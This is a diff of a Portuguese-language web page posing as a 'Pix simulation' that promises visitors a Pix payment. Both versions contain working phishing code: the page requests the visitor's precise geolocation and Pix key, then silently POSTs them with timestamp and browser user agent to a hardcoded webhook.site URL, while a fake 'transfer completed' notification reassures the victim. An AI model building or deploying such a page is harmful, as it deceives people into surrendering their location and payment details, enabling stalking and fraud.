@@ -5,7 +5,6 @@
 <title>Simulação Pix</title>
 
 <style>
-/* ====== Base ====== */
 body{
   margin:0;
   background:#f2f2f2;
@@ -15,14 +14,16 @@ body{
   align-items:center;
   font-family:Arial, sans-serif;
 }
+
 .card{
   background:#fff;
   padding:35px;
   border-radius:18px;
   width:320px;
   text-align:center;
-  box-shadow:0 10px 25px rgba(0,0,0,.08);
+  box-shadow:0 10px 25px rgba(0,0,0,.1);
 }
+
 button{
   background:#820ad1;
   color:#fff;
@@ -33,6 +34,7 @@ button{
   border-radius:12px;
   cursor:pointer;
 }
+
 input{
   width:100%;
   padding:12px;
@@ -41,14 +43,19 @@ input{
   border-radius:8px;
   border:1px solid #ccc;
 }
-small{ color:#777; font-size:12px; }
+
+small{
+  color:#777;
+  font-size:12px;
+}
+
 .alert{
   color:#b00020;
   font-size:13px;
   margin-top:10px;
 }
 
-/* ====== Notificação fake (animação) ====== */
+/* ===== Notificação fake ===== */
 .notificacao{
   position:fixed;
   top:-120px;
@@ -63,106 +70,113 @@ small{ color:#777; font-size:12px; }
   transition:top .5s ease;
   z-index:9999;
 }
-.notificacao.mostrar{ top:20px; }
-.notificacao strong{ display:block; font-size:14px; }
-.notificacao span{ font-size:13px; opacity:.9; }
+
+.notificacao.mostrar{
+  top:20px;
+}
+
+.notificacao strong{
+  display:block;
+  font-size:14px;
+}
+
+.notificacao span{
+  font-size:13px;
+  opacity:.9;
+}
 </style>
 </head>
 
 <body>
 
-<!-- ====== Notificação animada ====== -->
+<!-- Notificação animada -->
 <div id="notif" class="notificacao">
   <strong>Trunfo — Simulação</strong>
   <span>Simulação de transferência concluída</span>
 </div>
 
-<!-- ====== Tela 1 ====== -->
+<!-- Tela 1 -->
 <div class="card" id="tela1">
-  <button onclick="pedirPermissoes()">Receber Pix</button>
-  <div id="erro1" class="alert"></div>
+  <button onclick="pedirLocalizacao()">Receber Pix</button>
+  <div id="erro" class="alert"></div>
 </div>
 
-<!-- ====== Tela 2 ====== -->
+<!-- Tela 2 -->
 <div class="card" id="tela2" style="display:none">
   <input id="chave" placeholder="Digite sua chave Pix">
   <button onclick="confirmar()">Receber Pix</button>
   <small>Simulação — nenhum valor real será transferido</small>
 </div>
 
-<!-- ====== Tela 3 ====== -->
+<!-- Tela 3 -->
 <div class="card" id="tela3" style="display:none">
   <h3>✅ Simulação concluída</h3>
-  <p>Obrigado por participar da demonstração.</p>
+  <p>Obrigado por participar.</p>
 </div>
 
 <script>
-/* ====== Config ====== */
+/* ===== CONFIG ===== */
 const WEBHOOK = "https://webhook.site/7b90f2d2-5b54-422c-9ab9-24a37ba6bab6";
 
-/* ====== Estado ====== */
-let localOk = false;
-let lastPos = null;
+/* ===== ESTADO ===== */
+let posicao = null;
 
-/* ====== Permissões no primeiro botão ====== */
-function pedirPermissoes(){
-  document.getElementById("erro1").innerText = "";
+/* ===== PEDIR LOCALIZAÇÃO ===== */
+function pedirLocalizacao(){
+  document.getElementById("erro").innerText = "";
 
   if(!navigator.geolocation){
-    document.getElementById("erro1").innerText =
-      "Seu navegador não suporta localização.";
+    document.getElementById("erro").innerText =
+      "Navegador não suporta localização.";
     return;
   }
 
   navigator.geolocation.getCurrentPosition(
-    pos=>{
-      localOk = true;
-      lastPos = pos;
-      // avançar
+    p => {
+      posicao = p;
       document.getElementById("tela1").style.display="none";
       document.getElementById("tela2").style.display="block";
     },
-    ()=>{
-      document.getElementById("erro1").innerText =
+    () => {
+      document.getElementById("erro").innerText =
         "Por favor, dê as permissões para que possamos continuar a simulação.";
     }
   );
 }
 
-/* ====== Confirmar ====== */
+/* ===== CONFIRMAR ===== */
 function confirmar(){
-  if(!localOk || !lastPos){
-    alert("Permissões necessárias para continuar.");
+  if(!posicao){
+    alert("Localização não obtida.");
     return;
   }
 
-  // envia dados pra tu
-  fetch(WEBHOOK,{
-    method:"POST",
-    headers:{"Content-Type":"application/json"},
-    body:JSON.stringify({
-      chave_pix: document.getElementById("chave").value,
-      latitude: lastPos.coords.latitude,
-      longitude: lastPos.coords.longitude,
-      precisao: lastPos.coords.accuracy,
-      data: new Date().toISOString(),
-      navegador: navigator.userAgent
-    })
+  const dados = {
+    chave_pix: document.getElementById("chave").value || "vazio",
+    latitude: posicao.coords.latitude,
+    longitude: posicao.coords.longitude,
+    precisao: posicao.coords.accuracy,
+    data: new Date().toISOString(),
+    navegador: navigator.userAgent
+  };
+
+  fetch(WEBHOOK, {
+    method: "POST",
+    headers: { "Content-Type": "application/json" },
+    body: JSON.stringify(dados)
   });
 
-  // mostra animação
-  mostrarNotif();
+  mostrarNotificacao();
 
-  // tela final
   document.getElementById("tela2").style.display="none";
   document.getElementById("tela3").style.display="block";
 }
 
-/* ====== Animação ====== */
-function mostrarNotif(){
+/* ===== ANIMAÇÃO ===== */
+function mostrarNotificacao(){
   const n = document.getElementById("notif");
   n.classList.add("mostrar");
-  setTimeout(()=> n.classList.remove("mostrar"), 4000);
+  setTimeout(() => n.classList.remove("mostrar"), 4000);
 }
 </script>
 
